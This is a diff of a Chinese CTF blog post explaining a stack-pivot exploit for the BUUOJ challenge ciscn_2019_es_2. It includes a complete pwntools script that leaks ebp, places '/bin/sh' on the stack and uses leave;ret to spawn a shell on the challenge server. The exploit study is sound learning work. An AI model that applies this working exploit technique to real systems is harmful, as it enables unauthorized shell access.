@@ -195,24 +195,27 @@
             
                 <span class="meta-info-item post-update-date">
                     <i class="icon fa-solid fa-file-pen"></i>&nbsp;
-                    <span class="datetime" data-updated="Tue Jul 29 2025 09:46:04 GMT+0800">2025-07-29 09:46:04</span>
+                    <span class="datetime" data-updated="Tue Aug 26 2025 16:16:10 GMT+0800">2025-08-26 16:16:10</span>
                 </span>
             
         
 
+        
+            <span class="meta-info-item post-category border-box"><i class="icon fas fa-folder"></i>&nbsp;
+                <ul class="post-category-ul">
+                    
+                            <li class="category-item"><a href="/categories/exercise-pwn/">exercise_pwn</a></li>
+                        
+                    
+                </ul>
+            </span>
         
 
         
             <span class="post-tag meta-info-item border-box">
                 <ul class="post-tag-ul">
                     
-                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/BUU/">BUU</a></li>
-                        
-                    
                             <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/PWN/">PWN</a></li>
-                        
-                    
-                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/%E6%A0%88%E8%BF%81%E7%A7%BB/">栈迁移</a></li>
                         
                     
                             <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/gdb/">gdb</a></li>
@@ -240,39 +243,36 @@
                     
 
                     
-                         <p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250724170641293.png"  alt="image-20250724170641293"></p>
+                         <p><a class="link"   target="_blank" rel="noopener" href="https://buuoj.cn/challenges#ciscn_2019_es_2" >题目<i class="fas fa-external-link-alt"></i></a></p>
+<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250724170641293.png"  alt="image-20250724170641293"></p>
 <p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250724170654784.png"  alt="image-20250724170654784"></p>
-<p>很明显的栈溢出漏洞，但是可操作空间太小，只能覆盖到返回地址，所以要用栈迁移</p>
+<p>很明显的栈溢出漏洞，但是可操作空间太小，只能覆盖到ret，所以要用栈迁移</p>
 <p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250724170939205.png"  alt="image-20250724170939205"></p>
-<p>有system函数，但是需要自己传参，小问题</p>
-<p>分析题目可知，有两次输入，第一次输入可以用来泄露ebp的地址</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=b&quot;a&quot;*0x27+b&quot;b&quot;</span><br></pre></td></tr></table></figure>
-
-
-
-
-
-<p>第二次要根据这个泄露出来的地址去构造我我们的后门函数</p>
+<p>有system函数，但是需要自己传参，可以把&#x2F;bin&#x2F;sh字符段放在栈上</p>
+<p>有两次输入，第一次输入可以用来泄露ebp的地址</p>
+<p>第二次要根据泄露地址去找加上偏移得到s的头部，在那里构造我们的后门函数，之后通过ret返回s头部执行这个后门函数。</p>
 <p>先查看ebp距离s的实际距离（gdb动态调试查看）</p>
 <p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250724171540124.png"  alt="image-20250724171540124"></p>
 <p>相距0xffffcf18 - 0xffffcee0 &#x3D; 0x38</p>
+<p>不能直接通过下面这种方式查看，因为现在的操作系统默认开启了<strong>ASLR</strong>，所以栈上的地址一直会变化</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250825160925706.png"  alt="image-20250825160925706"></p>
 <p>接着构造我们的后门函数</p>
 <p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250724174105733.png"  alt="image-20250724174105733"></p>
-<p>所以</p>
+<p>且因为跳转到s后还要执行，所以程序不能崩溃 ，如果s可以直接跳转到后门函数就可以直接把地址写在ret上</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload=b&#x27;aaaa&#x27;+p32(sys)+p32(main)+p32(s+16)+b&quot;/bin/sh&quot;</span><br><span class="line">payload=payload.ljust(0x28,b&quot;\x00&quot;)</span><br><span class="line">payload+=p32(s)+p32(leave)</span><br></pre></td></tr></table></figure>
 
-<p><code>payload.ljust(0x28, b&#39;\x00&#39;)</code> 中使用 <code>b&#39;\x00&#39;</code> 是为了<strong>确保字符串在 <code>printf</code> 输出时能够正确终止，并且避免引入不必要的非空字节干扰后续的栈操作</strong>。因此，<code>b&#39;\x00&#39;</code> <strong>不能随意替换</strong>。</p>
-<p>解释一下leave ret指令的作用过程</p>
-<p><code>leave</code></p>
+<p><code>payload.ljust(0x28, b&#39;\x00&#39;)</code> 中必须使用 <code>b&#39;\x00&#39;</code> 因为printf会在接下来的数据中找符合%s的数据，如果没有”&#x2F;x00”，他可能去读取继续往后读到栈上的数据，%s时字符串，printf读到不可打印的字符会引发错误</p>
+<p><code>leave ret</code>解释</p>
+<p>leave</p>
 <p>mov esp, ebp:把esp移动到ebp-0x38的位置（ebp-0x38)其实就是aaaa的位置</p>
 <p>pop ebp：把aaaa这一块pop出去了</p>
-<p><code>ret</code></p>
+<p>ret</p>
 <p>pop eip:,把栈顶的system函数pop出去作为返回地址</p>
 <h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">#p=process(&quot;./ciscn_2019_es_2&quot;)</span><br><span class="line">p=remote(&quot;node5.buuoj.cn&quot;,25671)</span><br><span class="line">sys=0x08048400</span><br><span class="line">main=0xdeadbeef</span><br><span class="line">leave=0x080485FD</span><br><span class="line"></span><br><span class="line">p.recvuntil(b&quot;name?\n&quot;)</span><br><span class="line">payload=b&quot;a&quot;*0x27+b&quot;b&quot;</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(b&quot;b&quot;)</span><br><span class="line">s=u32(p.recv(4))-0x38</span><br><span class="line">print(hex(s))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload=b&#x27;aaaa&#x27;+p32(sys)+p32(main)+p32(s+16)+b&quot;/bin/sh&quot;</span><br><span class="line">payload=payload.ljust(0x28,b&quot;\x00&quot;)</span><br><span class="line">payload+=p32(s)+p32(leave)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
 
 
-<h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><h3 id="栈空间是识别"><a href="#栈空间是识别" class="headerlink" title="栈空间是识别"></a>栈空间是识别</h3><p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250724182140887.png"  alt="image-20250724182140887"></p>
+<h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><h3 id="栈空间识别"><a href="#栈空间识别" class="headerlink" title="栈空间识别"></a>栈空间识别</h3><p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250724182140887.png"  alt="image-20250724182140887"></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">偏移量  │ 寄存器/标识符     |    地址     |    内容         &lt;-- 解释</span><br><span class="line">-------+------------------------------------------</span><br><span class="line">00:0000│       esp         0xffffced0 —▸ 0x80486ca ◂— dec eax /* &#x27;Hello, %s\n&#x27; */</span><br></pre></td></tr></table></figure>
 
 <p><strong><code>0xffffced0</code></strong>: <code>ESP</code> 寄存器当前指向的内存地址。</p>
@@ -314,15 +314,7 @@
                             <ul class="post-tags-box border-box">
                                 
                                     <li class="tag-item border-box">
-                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/BUU/">BUU</a>
-                                    </li>
-                                
-                                    <li class="tag-item border-box">
                                         <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/PWN/">PWN</a>
-                                    </li>
-                                
-                                    <li class="tag-item border-box">
-                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/%E6%A0%88%E8%BF%81%E7%A7%BB/">栈迁移</a>
                                     </li>
                                 
                                     <li class="tag-item border-box">
@@ -345,14 +337,14 @@
                             <div class="prev-post">
                                 <a class="prev"
                                    rel="prev"
-                                   href="/2025/07/26/pwn44/"
-                                   title="pwn44"
+                                   href="/2025/07/26/pwn49/"
+                                   title="pwn49"
                                 >
                                     <span class="left arrow-icon flex-center">
                                         <i class="fas fa-chevron-left"></i>
                                     </span>
                                     <span class="title flex-center">
-                                        <span class="post-nav-title-item text-ellipsis">pwn44</span>
+                                        <span class="post-nav-title-item text-ellipsis">pwn49</span>
                                         <span class="post-nav-item">Prev posts</span>
                                     </span>
                                 </a>
@@ -362,11 +354,11 @@
                             <div class="next-post">
                                 <a class="next"
                                    rel="next"
-                                   href="/2025/07/24/UPX%E6%89%8B%E8%84%B1%E5%A3%B3/"
-                                   title="UPX手脱壳"
+                                   href="/2025/07/23/%E6%A0%88%E6%BA%A2%E5%87%BA%E8%BF%9B%E9%98%B6/"
+                                   title="栈溢出进阶"
                                 >
                                     <span class="title flex-center">
-                                        <span class="post-nav-title-item text-ellipsis">UPX手脱壳</span>
+                                        <span class="post-nav-title-item text-ellipsis">栈溢出进阶</span>
                                         <span class="post-nav-item">Next posts</span>
                                     </span>
                                     <span class="right arrow-icon flex-center">
